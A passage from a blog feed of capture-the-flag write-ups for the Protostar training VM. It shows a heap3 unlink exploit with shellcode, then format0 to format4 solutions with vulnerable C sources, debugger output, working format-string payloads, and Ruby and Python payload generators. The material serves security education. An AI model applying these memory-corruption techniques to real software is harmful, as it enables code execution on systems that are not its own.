    0x0000->0x0039 at 0x0000c49e: .comment READONLY HAS_CONTENTS
{% endcodeblock %}</p>

<p>Exploit:</p>

<p>{% codeblock lang:ruby exploit-backward.rb %}</p>

<h1>!/usr/bin/env ruby</h1>

<h1>user@protostar:~$ objdump -d /opt/protostar/bin/heap3 -M intel</h1>

<h1>&hellip;</h1>

<h1>8048935:       e8 56 fe ff ff          call   8048790 &lt;puts@plt></h1>

<h1>user@protostar:~$ objdump -TR /opt/protostar/bin/heap3 | grep &ldquo;R_386_JUMP_SLOT.* puts&rdquo;</h1>

<h1>0804b128 R_386_JUMP_SLOT   puts</h1>

<h1>gdb> print /x 0x0804b128-0x0c</h1>

<h1>$1 = 0x804b11c</h1>

<h1>user@protostar:~$ nm /opt/protostar/bin/heap3 | grep winner</h1>

<h1>08048864 T winner</h1>

<h1>root@kali32:~# rasm2 -C &lsquo;push 0x08048864; ret&rsquo;</h1>

<h1>&ldquo;\x68\x64\x88\x04\x08\xc3&rdquo;</h1>

<h1>user@protostar:/tmp$ ltrace -e strcpy /opt/protostar/bin/heap3 a b c</h1>

<h1>strcpy(0x0804c008, &ldquo;a&rdquo;)                              = 0x0804c008</h1>

<h1>strcpy(0x0804c030, &ldquo;b&rdquo;)                              = 0x0804c030</h1>

<h1>strcpy(0x0804c058, &ldquo;c&rdquo;)                              = 0x0804c058</h1>

<h1>gdb> print /x 0x0804c008 + 0x04</h1>

<h1>$1 = 0x804c00c</h1>

<p>binary = &ldquo;/opt/protostar/bin/heap3&rdquo;</p>

<h1>chunk1</h1>

<p>argv1  = &ldquo;XXXX&rdquo;                        # user data, later overwritten by second free()
argv1 &lt;&lt; &ldquo;\x68\x64\x88\x04\x08\xc3&rdquo;    # shellcode</p>

<h1>chunk2</h1>

<p>argv2  = &ldquo;X&rdquo; * 24 + &ldquo;\x01&rdquo; + &ldquo;ABCDEFG&rdquo; # user data</p>

<h1>chunk3</h1>

<p>argv2 &lt;&lt; [0xfffffff8].pack(&ldquo;V&rdquo;)        # prev_size = -8 &amp;&amp; PREV_INUSE = 0
argv2 &lt;&lt; [0xfffffffc].pack(&ldquo;V&rdquo;)        # size = -4
argv2 &lt;&lt; [0x44444444].pack(&ldquo;V&rdquo;)        # prev_size(unused) for fake chunk
argv2 &lt;&lt; [0x45454545].pack(&ldquo;V&rdquo;)        # size(unused) for fake chunk
argv2 &lt;&lt; [0x0804b11c].pack(&ldquo;V&rdquo;)        # ret_loc-0x0c
argv2 &lt;&lt; [0x0804c00c].pack(&ldquo;V&rdquo;)        # ret_addr
argv3  = &ldquo;X&rdquo;</p>

<h1><em>(0x0804b11c+12) = 0x0804c00c; </em>(0x0804c00c+8) = 0x0804b11c</h1>

<p>puts %x[ #{binary} &ldquo;#{argv1}&rdquo; &ldquo;#{argv2}&rdquo; &ldquo;#{argv3}&rdquo; ]
{% endcodeblock %}</p>

<p>To explain the logic behind our code, because <code>size</code> has the lowest bit set as
<code>!PREV_INUSE</code> and <code>p</code> points to the beginning of our current chunk, we
triggered the following part of pseudocode with the first <code>free()</code>:</p>

<p>{% codeblock lang:c %}
  if (!(hd &amp; PREV_INUSE))                    /<em> consolidate backward </em>/
  {
    prevsz = -8
    p = chunk_at_offset(p, +8);
    unlink(p, bck, fwd);
  }
{% endcodeblock %}</p>

<p>Here the address of &ldquo;virtual chunk&rdquo; was computed and unlinked:
{% codeblock lang:ruby %}
[0x44444444].pack(&ldquo;V&rdquo;) # prev_size
[0x45454545].pack(&ldquo;V&rdquo;) # size
[0x0804b11c].pack(&ldquo;V&rdquo;) # fwd
[0x0804c00c].pack(&ldquo;V&rdquo;) # bck
{% endcodeblock %}</p>

<p>However, there is another test in consolidate forward:</p>

<p>{% codeblock %}
  if (!(inuse_bit_at_offset(next, nextsz)))   /<em> consolidate forward </em>/
    unlink(next, bck, fwd);</p>

<p>0x08049918 &lt;free+244>:  mov    eax,DWORD PTR [ebp-0x24] ; eax:FFFFFFF8 = -8
0x0804991b &lt;free+247>:  mov    edx,DWORD PTR [ebp-0x28] ; 0x804c04c: &ldquo;DEFG\370\377\377\377\374\377\377\377X&rdquo;
0x0804991e &lt;free+250>:  lea    eax,[edx+eax*1]          ; 0x804c044: &ldquo;XXXX\001ABCDEFG\370\377\377\377\374\377\377\377X&rdquo;
0x08049921 &lt;free+253>:  mov    eax,DWORD PTR [eax+0x4]  ; eax:43424101
0x08049924 &lt;free+256>:  and    eax,0x1                  ; eax:00000001 = PREV_INUSE flag
0x08049927 &lt;free+259>:  mov    DWORD PTR [ebp-0x20],eax ;
0x0804992a &lt;free+262>:  mov    eax,DWORD PTR [ebp-0x28] ; 0x804c04c: &ldquo;DEFG\370\377\377\377\374\377\377\377X&rdquo;
0x0804992d &lt;free+265>:  mov    edx,DWORD PTR [ebp-0x24] ; edx:FFFFFFF8
0x08049930 &lt;free+268>:  mov    DWORD PTR [eax+0x4],edx<br/>
0x08049933 &lt;free+271>:  cmp    DWORD PTR [ebp-0x20],0x0 ; PREV_INUSE set?</p>

<p>{% endcodeblock %}</p>

<p>Here at the position <code>-0x4</code> is <code>DEFG</code> chunk (prev_size), with the size <code>-0x8</code>, where the <code>PREV_INUSE</code> flag is set <code>(0x43424101)</code>, so we skipped
the forward consolidation:</p>

<p>{% codeblock lang:ruby %}
argv2  = &ldquo;X&rdquo; * 24 + &ldquo;\x01&rdquo; + &ldquo;ABCDEFG&rdquo; # user data
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:/tmp$ /opt/protostar/bin/heap3 $(ruby -e &lsquo;print &ldquo;XXXX&rdquo; + &ldquo;\x68\x64\x88\x04\x08\xc3&rdquo;&rsquo;) $(ruby -e &lsquo;print &ldquo;X&rdquo; * 24 + &ldquo;\x01&rdquo; + &ldquo;ABCDEFG&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + &ldquo;AAAABBBB&rdquo; + [0x0804b11c].pack(&ldquo;V&rdquo;) + [0x0804c00c].pack(&ldquo;V&rdquo;)&rsquo;) X
that wasn&rsquo;t too bad now, was it? @ 1435304932</p>

<p>user@protostar:/tmp$ ./exploit-backward.rb
that wasn&rsquo;t too bad now, was it? @ 1435304818</p>

<h2>{% endcodeblock %}</h2>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Format Levels)]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/28/exploit-exercises-protostar-format-levels/"/>
    <updated>2015-06-28T09:29:15+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/28/exploit-exercises-protostar-format-levels</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>

<h2>Protostar Format0</h2>

<p>{% codeblock lang:c format0.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>void vuln(char *string)
{
  volatile int target;
  char buffer[64];</p>

<p>  target = 0;</p>

<p>  sprintf(buffer, string);</p>

<p>  if(target == 0xdeadbeef) {
      printf(&ldquo;you have hit the target correctly :)\n&rdquo;);
  }
}</p>

<p>int main(int argc, char **argv)
{
  vuln(argv[1]);
}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ gdb -q /opt/protostar/bin/format0
&hellip;
gdb> disassemble vuln
Dump of assembler code for function vuln:
0x080483f4 &lt;vuln+0>:    push   ebp
0x080483f5 &lt;vuln+1>:    mov    ebp,esp
0x080483f7 &lt;vuln+3>:    sub    esp,0x68
0x080483fa &lt;vuln+6>:    mov    DWORD PTR [ebp-0xc],0x0
0x08048401 &lt;vuln+13>:   mov    eax,DWORD PTR [ebp+0x8]
0x08048404 &lt;vuln+16>:   mov    DWORD PTR [esp+0x4],eax
0x08048408 &lt;vuln+20>:   lea    eax,[ebp-0x4c]
0x0804840b &lt;vuln+23>:   mov    DWORD PTR [esp],eax
0x0804840e &lt;vuln+26>:   call   0x8048300 &lt;sprintf@plt>
0x08048413 &lt;vuln+31>:   mov    eax,DWORD PTR [ebp-0xc]
0x08048416 &lt;vuln+34>:   cmp    eax,0xdeadbeef
0x0804841b &lt;vuln+39>:   jne    0x8048429 &lt;vuln+53>
0x0804841d &lt;vuln+41>:   mov    DWORD PTR [esp],0x8048510
0x08048424 &lt;vuln+48>:   call   0x8048330 &lt;puts@plt>
0x08048429 &lt;vuln+53>:   leave<br/>
0x0804842a &lt;vuln+54>:   ret  <br/>
End of assembler dump.</p>

<p>gdb> b *0x08048413
Breakpoint 1 at 0x8048413: file format0/format0.c, line 15.</p>

<p>gdb> r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
&hellip;
Breakpoint 1, vuln (string=0x41386341 <Address 0x41386341 out of bounds>) at format0/format0.c:15
15  in format0/format0.c</p>

<p>gdb> x /1xw $ebp-0xc
0xbffff6ec: 0x63413163
{% endcodeblock %}</p>

<p>From the output above, we can see:
{% codeblock %}</p>

<h1>addr of &lsquo;int target&rsquo;:</h1>

<p>0x080483fa &lt;vuln+6>:    mov    DWORD PTR [ebp-0xc],0x0</p>

<h1>addr of &lsquo;char *string&rsquo;:</h1>

<p>0x08048401 &lt;vuln+13>:   mov    eax,DWORD PTR [ebp+0x8]
0x08048404 &lt;vuln+16>:   mov    DWORD PTR [esp+0x4],eax</p>

<h1>addr of &lsquo;char buffer[64]&rsquo;:</h1>

<p>0x08048408 &lt;vuln+20>:   lea    eax,[ebp-0x4c]
{% endcodeblock %}</p>

<p>Because the pattern <code>0x63413163</code> means offset 64, we could trivially pass the
challenge by overflowing <code>buffer</code> array, because <code>int target</code> follows immediately
(0x4c - 64 = 0xc):</p>

<p>{% codeblock %}
user@protostar:~$ /opt/protostar/bin/format0 $(ruby -e &lsquo;print &ldquo;A&rdquo; * 64 + [0xdeadbeef].pack(&ldquo;V&rdquo;)&rsquo;)
you have hit the target correctly :)
{% endcodeblock %}</p>

<p>This level should be done in less than 10 bytes of input, so let&rsquo;s try similar
approach by overflowing the buffer using format string exploitation.</p>

<p>{% codeblock %}
user@protostar:~$ /opt/protostar/bin/format0 $(ruby -e &lsquo;print &ldquo;%64x&rdquo; + [0xdeadbeef].pack(&ldquo;V&rdquo;)&rsquo;)
you have hit the target correctly :)</p>

<p>user@protostar:~$ ruby -e &lsquo;print &ldquo;%64x&rdquo; + [0xdeadbeef].pack(&ldquo;V&rdquo;)&rsquo; > /tmp/payload</p>

<p>user@protostar:~$ wc -c /tmp/payload
8 /tmp/payload</p>

<p>user@protostar:~$ /opt/protostar/bin/format0 $(cat /tmp/payload)
you have hit the target correctly :)
{% endcodeblock %}</p>

<h2>Protostar Format1</h2>

<p>{% codeblock lang:c format1.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>int target;</p>

<p>void vuln(char *string)
{
  printf(string);</p>

<p>  if(target) {
      printf(&ldquo;you have modified the target :)\n&rdquo;);
  }
}</p>

<p>int main(int argc, char **argv)
{
  vuln(argv[1]);
}
{% endcodeblock %}</p>

<p>We want to write something to global variable <code>target</code>, stored in <code>bss</code> section. It has fixed address:
{% codeblock %}
user@protostar:~$ objdump -t /opt/protostar/bin/format1 | grep target
08049638 g     O .bss   00000004              target</p>

<p>user@protostar:~$ nm /opt/protostar/bin/format1 | grep target
08049638 B target
{% endcodeblock %}</p>

<p>To find the <code>DDDD = 0x44444444</code> on the stack, after a few tries we have:
{% codeblock %}
user@protostar:~$ /opt/protostar/bin/format1 &ldquo;$(ruby -e &lsquo;print &#8220;DDDD&rdquo; + &ldquo; %p&rdquo; * 200&rsquo;)&ldquo;
DDDD 0x804960c 0xbffff528 0x8048469 0xb7fd8304 0xb7fd7ff4 0xbffff528 0x8048435 0xbffff718 0xb7ff1040 0x804845b 0xb7fd7ff4 0x8048450 (nil) 0xbffff5a8 0xb7eadc76 0x2 0xbffff5d4 0xbffff5e0 0xb7fe1848 0xbffff590 0xffffffff 0xb7ffeff4 0x804824d 0x1 0xbffff590 0xb7ff0626 0xb7fffab0 0xb7fe1b28 0xb7fd7ff4 (nil) (nil) 0xbffff5a8 0xcec48558 0xe4969348 (nil) (nil) (nil) 0x2 0x8048340 (nil) 0xb7ff6210 0xb7eadb9b 0xb7ffeff4 0x2 0x8048340 (nil) 0x8048361 0x804841c 0x2 0xbffff5d4 0x8048450 0x8048440 0xb7ff1040 0xbffff5cc 0xb7fff8f8 0x2 0xbffff6fd 0xbffff718 (nil) 0xbffff975 0xbffff983 0xbffff997 0xbffff9b8 0xbffff9cb 0xbffff9de 0xbffff9e8 0xbffffed8 0xbfffff16 0xbfffff2a 0xbfffff39 0xbfffff4a 0xbfffff52 0xbfffff62 0xbfffff6f 0xbfffffa3 0xbfffffb2 0xbfffffcf (nil) 0x20 0xb7fe2414 0x21 0xb7fe2000 0x10 0xfabfbff 0x6 0x1000 0x11 0x64 0x3 0x8048034 0x4 0x20 0x5 0x7 0x7 0xb7fe3000 0x8 (nil) 0x9 0x8048340 0xb 0x3e9 0xc (nil) 0xd 0x3e9 0xe 0x3e9 0x17 0x1 0x19 0xbffff6db 0x1f 0xbfffffe1 0xf 0xbffff6eb (nil) (nil) (nil) (nil) (nil) 0xd4000000 0x72facad1 0x50139897 0x39f1f921 0x695501e9 0x363836 (nil) (nil) (nil) 0x706f2f00 0x72702f74 0x736f746f 0x2f726174 0x2f6e6962 0x6d726f66 0x317461 0x44444444 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025</p>

<p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;$(ruby -e &lsquo;print &#8220;DDDD&rdquo; + &ldquo; %p&rdquo; * 140&rsquo;)&ldquo;
DDDD 0x804960c 0xbffff5e8 0x8048469 0xb7fd8304 0xb7fd7ff4 0xbffff5e8 0x8048435 0xbffff7cc 0xb7ff1040 0x804845b 0xb7fd7ff4 0x8048450 (nil) 0xbffff668 0xb7eadc76 0x2 0xbffff694 0xbffff6a0 0xb7fe1848 0xbffff650 0xffffffff 0xb7ffeff4 0x804824d 0x1 0xbffff650 0xb7ff0626 0xb7fffab0 0xb7fe1b28 0xb7fd7ff4 (nil) (nil) 0xbffff668 0x9cacbe0e 0xb6ff281e (nil) (nil) (nil) 0x2 0x8048340 (nil) 0xb7ff6210 0xb7eadb9b 0xb7ffeff4 0x2 0x8048340 (nil) 0x8048361 0x804841c 0x2 0xbffff694 0x8048450 0x8048440 0xb7ff1040 0xbffff68c 0xb7fff8f8 0x2 0xbffff7b1 0xbffff7cc (nil) 0xbffff975 0xbffff983 0xbffff997 0xbffff9b8 0xbffff9cb 0xbffff9de 0xbffff9e8 0xbffffed8 0xbfffff16 0xbfffff2a 0xbfffff39 0xbfffff4a 0xbfffff52 0xbfffff62 0xbfffff6f 0xbfffffa3 0xbfffffb2 0xbfffffcf (nil) 0x20 0xb7fe2414 0x21 0xb7fe2000 0x10 0xfabfbff 0x6 0x1000 0x11 0x64 0x3 0x8048034 0x4 0x20 0x5 0x7 0x7 0xb7fe3000 0x8 (nil) 0x9 0x8048340 0xb 0x3e9 0xc (nil) 0xd 0x3e9 0xe 0x3e9 0x17 0x1 0x19 0xbffff79b 0x1f 0xbfffffe1 0xf 0xbffff7ab (nil) (nil) (nil) (nil) (nil) 0xd3000000 0xaf79b817 0x53b8b1a3 0x6ce5252 0x69b1ee44 0x363836 0x706f2f00 0x72702f74 0x736f746f 0x2f726174 0x2f6e6962 0x6d726f66 0x317461 0x44444444 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025</p>

<p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;DDDD %140\$x&rdquo;
DDDD 78243034</p>

<p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;DDDD %139\$x&rdquo;
DDDD 31252044</p>

<p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;DDDD %138\$x&rdquo;
DDDD 44444400</p>

<p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;DDDD  %138\$x&rdquo;
DDDD  44444444</p>

<p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;$(ruby -e &lsquo;print &#8220;DDDD  %138\$x&rdquo;&rsquo;)&ldquo;
DDDD  44444444</p>

<p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;$(ruby -e &lsquo;print [0x44444444].pack(&#8220;V&rdquo;) + &ldquo;  %138\$x&rdquo;&rsquo;)&ldquo;
DDDD  44444444</p>

<p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;$(ruby -e &lsquo;print [0x08049638].pack(&#8220;V&rdquo;) + &ldquo;  %138\$x&rdquo;&rsquo;)&ldquo;
8  8049638</p>

<p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;$(ruby -e &lsquo;print [0x08049638].pack(&#8220;V&rdquo;) + &ldquo;  %138\$n&rdquo;&rsquo;)&ldquo;
8  you have modified the target :)
{% endcodeblock %}</p>

<h2>Protostar Format2</h2>

<p>{% codeblock lang:c format2.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>int target;</p>

<p>void vuln()
{
  char buffer[512];</p>

<p>  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);</p>

<p>  if(target == 64) {
      printf(&ldquo;you have modified the target :)\n&rdquo;);
  } else {
      printf(&ldquo;target is %d :(\n&rdquo;, target);
  }
}</p>

<p>int main(int argc, char **argv)
{
  vuln();
}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ ruby -e &lsquo;print &ldquo;DDDD&rdquo; + &ldquo; %p&rdquo; * 10&rsquo; | /opt/protostar/bin/format2
DDDD 0x200 0xb7fd8420 0xbffff5d4 0x44444444 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070target is 0 :(</p>

<p>user@protostar:~$ ruby -e &lsquo;print &ldquo;DDDD %4\$p&rdquo;&rsquo; | /opt/protostar/bin/format2
DDDD 0x44444444target is 0 :(</p>

<p>user@protostar:~$ nm /opt/protostar/bin/format2 | grep target
080496e4 B target</p>

<p>user@protostar:~$ ruby -e &lsquo;print [0x080496e4].pack(&ldquo;V&rdquo;) + &ldquo; %4\$p&rdquo;&rsquo; | /opt/protostar/bin/format2
 0x80496e4target is 0 :(</p>

<p>user@protostar:~$ ruby -e &lsquo;print [0x080496e4].pack(&ldquo;V&rdquo;) + &ldquo; %4\$n&rdquo;&rsquo; | /opt/protostar/bin/format2
 target is 5 :(</p>

<p>user@protostar:~$ ruby -e &lsquo;print [0x080496e4].pack(&ldquo;V&rdquo;) + &ldquo; %4\$x %4\$n&rdquo;&rsquo; | /opt/protostar/bin/format2
 80496e4 target is 13 :(</p>

<p>user@protostar:~$ ruby -e &lsquo;print [0x080496e4].pack(&ldquo;V&rdquo;) + &ldquo; %4\$61x %4\$n&rdquo;&rsquo; | /opt/protostar/bin/format2
                                                       80496e4 target is 67 :(</p>

<p>user@protostar:~$ ruby -e &lsquo;print [0x080496e4].pack(&ldquo;V&rdquo;) + &ldquo; %4\$58x %4\$n&rdquo;&rsquo; | /opt/protostar/bin/format2
                                                    80496e4 you have modified the target :)
{% endcodeblock %}</p>

<h2>Protostar Format3</h2>

<p>{% codeblock lang:c format3.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>int target;</p>

<p>void printbuffer(char *string)
{
  printf(string);
}</p>

<p>void vuln()
{
  char buffer[512];</p>

<p>  fgets(buffer, sizeof(buffer), stdin);</p>

<p>  printbuffer(buffer);</p>

<p>  if(target == 0x01025544) {
      printf(&ldquo;you have modified the target :)\n&rdquo;);
  } else {
      printf(&ldquo;target is %08x :(\n&rdquo;, target);
  }
}</p>

<p>int main(int argc, char **argv)
{
  vuln();
}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ ruby -e &lsquo;print &ldquo;DDDD&rdquo; + &ldquo; %p&rdquo; * 25&rsquo; | /opt/protostar/bin/format3
DDDD (nil) 0xbffff590 0xb7fd7ff4 (nil) (nil) 0xbffff798 0x804849d 0xbffff590 0x200 0xb7fd8420 0xbffff5d4 0x44444444 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520target is 00000000 :(</p>

<p>user@protostar:~$ ruby -e &lsquo;print &ldquo;DDDD %12\$p&rdquo;&rsquo; | /opt/protostar/bin/format3
DDDD 0x44444444target is 00000000 :(</p>

<p>user@protostar:~$ nm /opt/protostar/bin/format3 | grep target
080496f4 B target
{% endcodeblock %}</p>

<p>We need to rewrite the address at <code>0x080496f4</code> with the value <code>0x01025544</code>. For this purpose we prepare simple ruby script to calculate the exact format string:</p>

<p>{% codeblock lang:ruby formatter.rb %}</p>

<h1>!/usr/bin/env ruby</h1>

<p>def check_param(fmt)
    return if fmt =~ /\d+:0x\h+:0x\h+/
    puts &ldquo;syntax: #{$0} &lt;position:target_address:shellcode_address>&rdquo;
    exit
end</p>

<p>fmt = ARGV[0]
check_param(fmt)</p>

<p>offset, target_addr, shellcode_addr = fmt.split(&ldquo;:&rdquo;)</p>

<h1>get high / low ordered bytes, remove 0x prefix</h1>

<p>hob = shellcode_addr[2,4].to_i(16)
lob = shellcode_addr[6,4].to_i(16)
addr = target_addr[2,8]
o = offset.to_i</p>

<p>a = []
if (hob > lob)
    f = lob - 8; s = hob - lob; a &lt;&lt; addr; a &lt;&lt; &ldquo;%08x&rdquo; % (addr.to_i(16)+2)
else
    f = hob - 8; s = lob - hob; a &lt;&lt; &ldquo;%08x&rdquo; % (addr.to_i(16)+2); a &lt;&lt; addr
end</p>

<p>puts &ldquo;ruby -e &lsquo;print [0x#{a[0]}].pack(&#34;V\&rdquo;) + [0x#{a[1]}].pack(\&ldquo;V\&rdquo;) + \&ldquo;%#{o}\$#{f}x%#{o}\$hn%#{o+1}\$#{s}x%#{o+1}\$hn\&rdquo;&rsquo;&ldquo;
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ ruby1.9.1 ./formatter.rb 12:0x080496f4:0x01025544
ruby -e &lsquo;print [0x080496f6].pack(&ldquo;V&rdquo;) + [0x080496f4].pack(&ldquo;V&rdquo;) + &ldquo;%12\$250x%12\$hn%13\$21570x%13\$hn&rdquo;&rsquo;</p>

<p>user@protostar:~$ ruby -e &lsquo;print [0x080496f6].pack(&ldquo;V&rdquo;) + [0x080496f4].pack(&ldquo;V&rdquo;) + &ldquo;%12\$250x%12\$hn%13\$21570x%13\$hn&rdquo;&rsquo; | /opt/protostar/bin/format3
&hellip;
80496f4you have modified the target :)
{% endcodeblock %}</p>

<p>The challenge could be also solved with <a href="https://github.com/hellman/libformatstr">hellman&rsquo;s libformatstr.py</a>.</p>

<p>{% codeblock %}
user@protostar:~$ git clone <a href="https://github.com/hellman/libformatstr">https://github.com/hellman/libformatstr</a>
Cloning into libformatstr&hellip;
remote: Counting objects: 51, done.
remote: Total 51 (delta 0), reused 0 (delta 0), pack-reused 51
Unpacking objects: 100% (51/51), done.</p>

<p>user@protostar:~$ cd libformatstr/
{% endcodeblock %}</p>

<p>{% codeblock lang:py exploit-format3.py %}</p>

<h1>!/usr/bin/env python</h1>

<p>import sys
from libformatstr import FormatStr</p>

<p>destination   = 0x080496f4
what_to_write = 0x01025544</p>

<p>p = FormatStr()
p[destination] = what_to_write</p>

<h1>buf is 12th argument, 0 bytes are already printed</h1>

<p>sys.stdout.write(p.payload(12, start_len=0))
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~/libformatstr$ python ./exploit-format3.py  | /opt/protostar/bin/format3
&hellip;
 p??you have modified the target :)
{% endcodeblock %}</p>

<h2>Protostar Format4</h2>

<p>{% codeblock lang:c format4.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>int target;</p>

<p>void hello()
{
  printf(&ldquo;code execution redirected! you win\n&rdquo;);
  _exit(1);
}</p>

<p>void vuln()
{
  char buffer[512];</p>

<p>  fgets(buffer, sizeof(buffer), stdin);</p>

<p>  printf(buffer);</p>

<p>  exit(1); <br/>
}</p>

<p>int main(int argc, char **argv)
{
  vuln();
}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ ruby -e &lsquo;print &ldquo;DDDD&rdquo; + &ldquo; %p&rdquo; * 25&rsquo; | /opt/protostar/bin/format4
DDDD 0x200 0xb7fd8420 0xbffff5b4 0x44444444 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x702520 0x1000 0x1</p>

<p>user@protostar:~$ ruby -e &lsquo;print &ldquo;DDDD %4\$p&rdquo;&rsquo; | /opt/protostar/bin/format4
DDDD 0x44444444</p>

<p>user@protostar:~$ objdump -TR /opt/protostar/bin/format4</p>

<p>/opt/protostar/bin/format4:     file format elf32-i386</p>

<p>DYNAMIC SYMBOL TABLE:
00000000  w   D  <em>UND</em>  00000000              <strong>gmon_start</strong>
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   fgets
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   <em><em>libc_start_main
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   </em>exit
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   printf
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   puts
00000000      DF <em>UND</em>  00000000  GLIBC_2.0   exit
080485ec g    DO .rodata    00000004  Base        </em>IO_stdin_used
08049730 g    DO .bss   00000004  GLIBC_2.0   stdin</p>

<p>DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080496fc R_386_GLOB_DAT    <strong>gmon_start</strong>
08049730 R_386_COPY        stdin
0804970c R_386_JUMP_SLOT   <strong>gmon_start</strong>
08049710 R_386_JUMP_SLOT   fgets
08049714 R_386_JUMP_SLOT   <em>_libc_start_main
08049718 R_386_JUMP_SLOT   </em>exit
0804971c R_386_JUMP_SLOT   printf
08049720 R_386_JUMP_SLOT   puts
08049724 R_386_JUMP_SLOT   exit</p>

<p>user@protostar:~$ objdump -d -j .plt /opt/protostar/bin/format4</p>

<p>/opt/protostar/bin/format4:     file format elf32-i386</p>

<p>Disassembly of section .plt:</p>

<p>0804837c &lt;<strong>gmon_start</strong>@plt-0x10>:
 804837c:   ff 35 04 97 04 08       pushl  0x8049704
 8048382:   ff 25 08 97 04 08       jmp    *0x8049708
 8048388:   00 00                   add    %al,(%eax)
    &hellip;</p>

<p>0804838c &lt;<strong>gmon_start</strong>@plt>:
 804838c:   ff 25 0c 97 04 08       jmp    *0x804970c
 8048392:   68 00 00 00 00          push   $0x0
 8048397:   e9 e0 ff ff ff          jmp    804837c &lt;_init+0x30></p>

<p>0804839c &lt;fgets@plt>:
 804839c:   ff 25 10 97 04 08       jmp    *0x8049710
 80483a2:   68 08 00 00 00          push   $0x8
 80483a7:   e9 d0 ff ff ff          jmp    804837c &lt;_init+0x30></p>

<p>080483ac &lt;<em>_libc_start_main@plt>:
 80483ac:   ff 25 14 97 04 08       jmp    *0x8049714
 80483b2:   68 10 00 00 00          push   $0x10
 80483b7:   e9 c0 ff ff ff          jmp    804837c &lt;</em>init+0x30></p>

<p>080483bc &lt;<em>exit@plt>:
 80483bc:   ff 25 18 97 04 08       jmp    *0x8049718
 80483c2:   68 18 00 00 00          push   $0x18
 80483c7:   e9 b0 ff ff ff          jmp    804837c &lt;</em>init+0x30></p>

<p>080483cc &lt;printf@plt>:
 80483cc:   ff 25 1c 97 04 08       jmp    *0x804971c
 80483d2:   68 20 00 00 00          push   $0x20
 80483d7:   e9 a0 ff ff ff          jmp    804837c &lt;_init+0x30></p>

<p>080483dc &lt;puts@plt>:
 80483dc:   ff 25 20 97 04 08       jmp    *0x8049720
 80483e2:   68 28 00 00 00          push   $0x28
 80483e7:   e9 90 ff ff ff          jmp    804837c &lt;_init+0x30></p>

<p>080483ec &lt;exit@plt>:
 80483ec:   ff 25 24 97 04 08       jmp    *0x8049724
 80483f2:   68 30 00 00 00          push   $0x30
 80483f7:   e9 80 ff ff ff          jmp    804837c &lt;_init+0x30></p>

<p>user@protostar:~$ nm /opt/protostar/bin/format4 | grep hello
080484b4 T hello
{% endcodeblock %}</p>

